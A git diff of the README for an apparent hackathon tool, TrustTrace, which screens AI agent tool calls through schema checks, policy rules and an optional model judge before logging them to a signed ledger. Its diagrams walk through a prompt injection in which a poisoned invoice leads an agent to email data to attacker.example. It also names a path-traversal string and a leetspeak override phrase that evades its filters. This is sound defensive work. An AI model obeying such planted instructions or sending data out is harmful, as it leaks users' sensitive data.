@@ -10,7 +10,7 @@ TrustTrace sits at the execution boundary: every proposed tool call is
 inspected *before* it runs, and every verdict is written to a tamper-evident,
 signed ledger.**
 
-| 8 scenarios | 5/5 attacks stopped | 0/3 benign blocked | ~1 ms policy latency (p50) |
+| 8 scenarios | 5/5 attacks flagged (BLOCK/REVIEW) | 0/3 benign blocked | ~1 ms local policy latency (p50) |
 |---|---|---|---|
 
 Measured with `POST /v1/simulate/run-all` on the bundled deterministic
@@ -32,23 +32,83 @@ call *and* the untrusted sources that influenced it.
 
 ## How it works
 
-```text
- Agent / LLM ──► proposed tool call (+ context sources)
-                         │
-                 ┌───────▼────────┐
-                 │ L0 Strict schema│  unknown tools / extra fields → BLOCK
-                 └───────┬────────┘
-                 ┌───────▼────────┐
-                 │ L1/L2 Policy    │  domains, sensitive data, SQL, CRM bulk,
-                 │ engine (YAML)   │  injection in untrusted context
-                 └───────┬────────┘
-                 ┌───────▼────────┐
-                 │ L3 Gemini judge │  optional; can only make a verdict stricter
-                 └───────┬────────┘
-              ALLOW ◄────┼────► REVIEW / BLOCK  (never reaches a tool)
-                 │       │
-        sandbox mock     ▼
-            tool     Signed audit ledger (SHA-256 chain + Ed25519)
+```mermaid
+flowchart TB
+  user(["User or agent developer"])
+  src[("Untrusted sources<br/>invoices, tickets, web pages")]
+
+  subgraph AGENT["AI agent · any LLM"]
+    llm["LLM plans a tool call"]
+  end
+
+  subgraph TT["TrustTrace API · FastAPI · local"]
+    direction TB
+    schema["L0 strict schema<br/>5 tools, extra fields rejected"]
+    policy["L1/L2 policy engine<br/>domains, sensitive data, SQL,<br/>CRM bulk, path traversal,<br/>injection in context<br/>rules.yaml"]
+    judge{{"L3 Gemini judge · optional<br/>can only tighten a verdict<br/>failure blocks"}}
+    decide{"Risk score<br/>under 0.4 · 0.4 to 0.7 · 0.7 or more"}
+    schema --> policy --> judge --> decide
+  end
+
+  subgraph OUT["Outcomes"]
+    allow["ALLOW<br/>sandbox mock tool only"]
+    review["REVIEW<br/>held for a human"]
+    block["BLOCK<br/>never executed"]
+  end
+
+  ledger[("Signed audit ledger<br/>SQLite · SHA-256 chain · Ed25519")]
+  dash["Dashboard · Next.js<br/>trace, verify chain, export JSON"]
+
+  user --> llm
+  src -. "poisoned text" .-> llm
+  llm -- "proposed call + context sources" --> schema
+  decide --> allow
+  decide --> review
+  decide --> block
+  decide -- "every verdict" --> ledger
+  ledger --> dash
+```
+
+### One attack, step by step
+
+```mermaid
+sequenceDiagram
+  autonumber
+  actor User
+  participant Agent as AI agent
+  participant API as TrustTrace API
+  participant Pol as Policy engine
+  participant Jdg as Gemini judge (optional)
+  participant Led as Signed ledger
+  participant Tool as Sandbox mock tool
+  participant Dash as Dashboard
+
+  User->>Agent: "Summarize this vendor invoice"
+  Agent->>Agent: reads invoice_4471.pdf (hidden instruction)
+  Agent->>API: POST /v1/execute send_email billing@attacker.example
+  API->>Pol: validate strict schema, then run rules
+  Pol-->>API: BLOCK risk 1.0 sensitive_data, unapproved_destination, exfiltration, untrusted_context_instruction
+  Note over API,Jdg: Deterministic BLOCK short-circuits. The judge is never asked and cannot override.
+  API->>Led: append event, hash-chain it, sign with Ed25519
+  API--xTool: not executed
+  API-->>Agent: BLOCK plus findings and source invoice_4471.pdf
+  Dash->>Led: GET /v1/audit/verify
+  Led-->>Dash: chain valid, signatures valid
+  User->>Dash: Export JSON evidence report
+```
+
+### Tamper-evident ledger
+
+```mermaid
+flowchart LR
+  e1["Event 1<br/>payload<br/>hash = SHA-256(payload + genesis)"] --> e2["Event 2<br/>payload<br/>hash = SHA-256(payload + hash 1)"] --> e3["Event 3<br/>payload<br/>hash = SHA-256(payload + hash 2)"]
+  key(["Ed25519 private key<br/>stays local"]) -. "signs each hash" .-> e1
+  key -.-> e2
+  key -.-> e3
+  verify{{"Verify chain<br/>recompute hashes + check signatures"}}
+  e3 --> verify
+  verify --> ok["Valid"]
+  verify --> bad["Edit any event → chain breaks"]
 ```
 
 | Risk score | Decision | Effect |
@@ -114,6 +174,19 @@ Open <http://localhost:3000>. The dashboard uses `http://localhost:8000` by
 default. To use a different backend, set `NEXT_PUBLIC_API_URL` before building
 the frontend; see [`frontend/.env.example`](frontend/.env.example).
 
+## Judge quick start
+
+The dashboard's **Judge quickstart** panel walks through the demo:
+
+1. **Run invoice attack** to see a synthetic malicious tool call intercepted.
+2. **Run full suite** to replay all eight deterministic examples and view the
+   scorecard.
+3. **Verify audit** to verify the hash chain and signatures for recorded events.
+
+The header reports whether the backend is connected and whether Gemini is
+configured. A configured judge is not a live reachability check; scenario
+replays remain deterministic and do not call an LLM.
+
 ## Use the dashboard
 
 1. Select **Run scenario** on a card to send its synthetic tool call to the
@@ -149,7 +222,8 @@ Interactive request/response examples are available at
 <http://localhost:8000/docs>.
 
 ![API docs](docs/api-docs.png)
- Common endpoints:
+
+Common endpoints:
 
 | Method and path | Purpose |
 |---|---|
@@ -206,7 +280,9 @@ tools are `send_email`, `query_db`, `update_crm`, `read_file`, and
 
 Edit [`backend/policy/rules.yaml`](backend/policy/rules.yaml) to change the
 allowed email/HTTP domains, sensitive-data patterns, restricted SQL tables, CRM
-bulk threshold, or email rate limit. Restart the backend after editing.
+bulk threshold, or email rate limit. File traversal paths such as
+`../../etc/passwd` are blocked by the file-tool policy. Restart the backend
+after editing.
 
 The API stores audit events in SQLite and creates an Ed25519 signing key on
 first start. Without Docker these files are
@@ -242,12 +318,22 @@ denylist (the usual first attempt) on the same eight scenarios:
 | Keyword filter | 1 / 5 | 4 / 8 | 0 / 3 |
 | **TrustTrace** | **5 / 5** | **8 / 8** | **0 / 3** |
 
+An attack is counted as caught when its result is `BLOCK` or `REVIEW`; a
+`REVIEW` is flagged for human attention, not silently blocked.
 The keyword filter misses attacks hidden in *retrieved context* or in an
 unapproved destination, and cannot return `REVIEW` for bulk changes. Caveat:
 the scenarios are the team's own, so this is a regression check, not proof of
 general detection. Adversarial evasion is the main known gap (for example leetspeak such as
 "1gn0re previous instructi0ns" is not caught by the regex rules; it is tracked
 as an expected-failure test) and the reason the optional model judge exists.
+
+## Hackathon integration status
+
+This checkout demonstrates deterministic local policy and sandboxed mock
+tools, with an optional Gemini judge. It does **not** yet demonstrate a runtime
+integration with Nebius Token Factory or an NVIDIA open-source model. Do not
+present the current demo as satisfying those hackathon requirements until that
+integration is implemented and shown running.
 
 ## Run the tests
 
@@ -315,7 +401,7 @@ incur API charges. The model's opinion is not a security guarantee.
 - [Backend setup and development](backend/README.md)
 - [Dashboard setup](frontend/README.md)
 - [3-minute demo video script](script.md)
-- [Pitch deck outline](PITCH.md)
+- [Presentation (PDF)](docs/presentation.pdf) · [HTML slides](docs/presentation.html) · [Pitch outline](PITCH.md)
 - [Project site](docs/index.html) (GitHub Pages: set Pages source to `/docs`)
 - [Durable project context](CONTEXT.md)
 - [Session handoff for future contributors/LLMs](SESSION.md)
